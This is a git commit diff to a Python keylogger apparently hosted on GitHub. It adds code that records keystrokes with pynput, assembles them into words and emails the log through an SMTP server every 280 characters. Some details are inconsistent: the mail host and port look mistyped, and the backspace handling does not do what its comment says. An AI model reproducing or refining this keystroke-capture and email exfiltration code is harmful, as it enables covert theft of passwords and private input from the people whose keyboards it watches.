67c62e09fc76b398b0d7eefb88a26d196e5a5833
Alfredo <76714792+aalejo92@users.noreply.github.com>
2021-06-06 14:03:23 -0400

    Update Keylogger.py
    06-06-21 - Added loop functions that cleans keystrokes to make output easily readable and changed format so that email is sent after every 280 characters instead

--- Keylogger.py
+++ Keylogger.py
@@ -1,5 +1,5 @@
-from pynput.keyboard import Key, Listener
-import logging
+from pynput.keyboard import Key, \
+    Listener  # A library I found that control and monitors input devices (mouse/keyboard input and monitoring)
 import getpass  # Library that makes password non-visible and keeps hidden from being logged
 import smtplib  # Protocol library for email
 
@@ -10,15 +10,38 @@ password = getpass.getpass(prompt='Password: ', stream=None)
 server = smtplib.SMTP_SSL('smt.gmail.com', 456)
 server.login(email, password)
 
-key_log = ""
-
-logging.basicConfig(filename=(key_log + "key_log.txt"),
-                    level=logging.DEBUG, format='%(asctime)s: %(message)s')
+# Logging input as strings to be looped
+key_log = ''
+word = ''
+email_character_limit = 280  # Chose a character limit of 280 based on twitters tweet limit
 
 
 # Function for recording keystrokes
 def on_press(key):
-    logging.info(str(key))
+    global word
+    global key_log
+    global email
+    global email_character_limit
+
+    # If user presses space or enter the function then adds a space after adding to the word count
+    if key == Key.space or key == Key.enter:
+        word += ' '
+        key_log += word
+        word = ''
+        if len(key_log) >= email_character_limit:
+            send_log()
+            key_log = ''
+    # Disregard user input of left or right
+    elif key == Key.shift_l or key == Key.shift_r:
+        return
+    # If user presses backspace it'll remove that character from the log
+    elif key == Key.backspace:
+        return
+    # Takes user input, removes quotes around character then stores it in 'word' logger
+    else:
+        char = f'{key}'
+        char = char[1:-1]
+        word += char
     # Use esc to exit loop
     if key == Key.esc:
         return False
